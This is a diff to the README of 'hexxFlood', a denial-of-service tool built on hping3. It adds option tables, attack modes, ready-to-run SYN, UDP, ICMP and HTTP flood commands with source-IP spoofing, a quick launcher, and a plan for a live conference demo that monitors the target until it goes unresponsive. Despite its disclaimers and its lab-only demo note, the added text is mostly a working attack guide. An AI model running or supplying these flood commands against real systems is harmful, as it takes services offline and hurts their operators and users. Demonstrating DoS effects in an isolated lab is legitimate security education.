@@ -15,6 +15,10 @@
 - ⚖️ The author takes **NO responsibility** for misuse
 - 🛡️ Use responsibly and ethically
 
+> **NULLCON DEMO NOTE:** For the live demonstration, run this **only** against your own
+> lab/target machine on an **isolated network you control** (e.g. an air-gapped switch or
+> a dedicated demo VLAN). Never point it at conference/venue infrastructure or any shared network.
+
 ---
 
 ## 🚀 Features
@@ -52,8 +56,192 @@
 git clone https://github.com/Cywarx/hexxFlood.git
 cd hexxFlood
 
-# Run setup
+# Run setup (installs hping3, python deps, etc.)
 sudo ./setup.sh
 
 # Verify installation
 hexxFlood -h
+```
+
+---
+
+## 🎮 Usage
+
+```bash
+sudo ./hexxFlood.sh [OPTIONS]
+```
+
+### Options
+
+| Option | Description |
+|--------|-------------|
+| `-t, --target IP`       | Target IP address |
+| `-u, --url URL`         | Target Web URL (`http://example.com`) |
+| `-p, --threads NUM`     | Number of threads (1-200, default: 50) |
+| `-s, --size BYTES`      | Packet size (64-65495, default: 65495) |
+| `-d, --delay MS`        | Delay (`u1`, `u10`, `u100`, default: `u1`) |
+| `-i, --interface IFACE` | Network interface (default: `wlan0`) |
+| `-m, --mode MODE`       | Mode: `easy` \| `medium` \| `high` \| `extreme` \| `custom` |
+| `-P, --ports PORTS`     | Comma-separated dst ports — floods **each** port (e.g. `80,443,22`) |
+| `-T, --type TYPES`      | Types: `syn,udp,icmp,ack,rst,fin,all,http` |
+| `-D, --duration SEC`    | Duration in seconds (0 = infinite) |
+| `--no-spoof`            | Disable source-IP spoofing (drops `--rand-source`) |
+| `--fixed-ports`         | Use a static dst port instead of an incrementing one |
+| `-h, --help`            | Show help |
+
+### Attack Modes
+
+| Mode | Threads | Delay | Attack Types |
+|------|---------|-------|--------------|
+| `easy`    | 10  | `u100` | syn, udp, icmp |
+| `medium`  | 25  | `u10`  | syn, udp, icmp, ack |
+| `high`    | 50  | `u1`   | syn, udp, icmp, ack, rst, fin |
+| `extreme` | 100 | `u1`   | all |
+| `custom`  | —   | —      | your own `-p / -d / -T` values |
+
+### Examples
+
+```bash
+# SYN flood against a lab target for 60 seconds
+sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -m high -D 60
+
+# Multi-port flood — hits 80, 443 and 22 simultaneously
+sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -P 80,443,22 -p 100
+
+# No spoofing (real source IP) with a fixed destination port
+sudo ./hexxFlood.sh -t 192.168.1.14 -T syn --no-spoof --fixed-ports
+
+# HTTP flood against a web app
+sudo ./hexxFlood.sh -u http://192.168.1.14 -T http -p 100
+
+# All attack types, extreme mode
+sudo ./hexxFlood.sh -t 192.168.1.14 -T all -m extreme
+```
+
+### Quick Launcher (`quick.sh`)
+
+Preset one-liners for common scenarios:
+
+```bash
+./quick.sh local             # extreme attack on default lab target
+./quick.sh local-test        # easy 30s smoke test
+./quick.sh web http://target # extreme web flood
+./quick.sh lab 10.0.0.5      # high-mode attack on ports 80,443,22
+./quick.sh custom            # interactive prompts
+./quick.sh status            # is anything running?
+./quick.sh stop              # kill all attacks
+```
+
+---
+
+## 📊 Monitoring the Attack (Live Demo)
+
+The repo ships a dedicated **`monitor.sh`** script so you can *demonstrate the impact* of the
+attack in real time — perfect for a side-by-side split screen during the NULLCON talk:
+**left pane = attack (`hexxFlood.sh`), right pane = monitor (`monitor.sh`).**
+
+### Recommended demo layout
+
+```
+┌───────────────────────────────┬───────────────────────────────┐
+│  ATTACKER PANE                 │  MONITOR PANE                  │
+│  sudo ./hexxFlood.sh \         │  ./monitor.sh \                │
+│    -t 192.168.1.14 -T syn \    │    -t 192.168.1.14 \           │
+│    -m high -D 120              │    -i wlan0 -m full            │
+└───────────────────────────────┴───────────────────────────────┘
+```
+
+Use `tmux` (or two terminals) to show both at once:
+
+```bash
+tmux new-session -d -s demo
+tmux split-window -h
+tmux send-keys -t demo:0.0 'sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -m high -D 120' C-m
+tmux send-keys -t demo:0.1 './monitor.sh -t 192.168.1.14 -i wlan0 -m full' C-m
+tmux attach -t demo
+```
+
+### Monitor usage
+
+```bash
+./monitor.sh [OPTIONS]
+```
+
+| Option | Description |
+|--------|-------------|
+| `-t, --target IP`       | Target IP to monitor (default: `192.168.1.14`) |
+| `-i, --interface IFACE` | Network interface (default: `wlan0`) |
+| `-m, --mode MODE`       | `ping` \| `network` \| `system` \| `full` \| `log` |
+| `-h, --help`            | Show help |
+
+### Monitor modes — what each one *shows the audience*
+
+| Mode | What it demonstrates | Command |
+|------|----------------------|---------|
+| **`ping`**    | Target latency spiking / **going unresponsive** — the clearest "it's down" signal | `./monitor.sh -t 192.168.1.14 -m ping` |
+| **`network`** | TX/RX packet counters climbing, active connections, live `hping3` process count | `./monitor.sh -i wlan0 -m network` |
+| **`system`**  | CPU/RAM/load spiking + top attack processes on the *attacker* box | `./monitor.sh -m system` |
+| **`full`**    | **All of the above on one dashboard** — the go-to view for the live demo | `./monitor.sh -t 192.168.1.14 -i wlan0 -m full` |
+| **`log`**     | Timestamps everything to `hexxFlood_monitor_<date>.log` for post-demo evidence | `./monitor.sh -t 192.168.1.14 -m log` |
+
+### Step-by-step: demonstrating the DoS live
+
+1. **Baseline first (before attacking).** Start the monitor and let the audience see a
+   *healthy* target — low ping (`time=X ms`), flat packet counters, normal CPU:
+   ```bash
+   ./monitor.sh -t 192.168.1.14 -i wlan0 -m full
+   ```
+2. **Launch the attack** in the second pane:
+   ```bash
+   sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -m high -D 120
+   ```
+3. **Watch the impact** on the monitor pane:
+   - Ping latency climbs, then flips to **`💀 TARGET UNRESPONSIVE!`**
+   - `TX packets` / `RX packets` counters race upward
+   - `hping3 Processes` and `Active Connections` jump
+   - Attacker CPU / Load Average spike
+4. **Stop the attack** — either wait for `-D` duration to elapse, or `Ctrl+C` the attacker pane.
+5. **Show recovery** — ping returns to normal, proving the target was only down *during* the attack.
+6. **(Optional) Keep evidence** — run a parallel `log` monitor so you have a timestamped file
+   to reference in Q&A:
+   ```bash
+   ./monitor.sh -t 192.168.1.14 -m log
+   ```
+
+### Verifying impact with standard tools (backup / cross-check)
+
+If you want additional, non-custom tooling on screen for credibility:
+
+```bash
+# Continuous latency graph
+ping 192.168.1.14
+
+# Live per-second interface throughput
+sudo iftop -i wlan0                 # or: sudo nload wlan0
+
+# Live packet capture proving the flood
+sudo tcpdump -i wlan0 host 192.168.1.14 -nn
+
+# Watch connection/socket counts climb
+watch -n1 'ss -s'
+```
+
+> **Tip:** For SYN floods, run `tcpdump` on the **target** to show a storm of half-open
+> `[S]` packets with spoofed source IPs — very visual for an audience.
+
+---
+
+## 🧹 Cleanup
+
+`hexxFlood.sh` cleans up its own child processes on exit. If anything is left running:
+
+```bash
+sudo pkill hping3
+sudo pkill -f http_flood.py
+```
+
+---
+
+## 📄 License
+
+Released under the [MIT License](LICENSE).
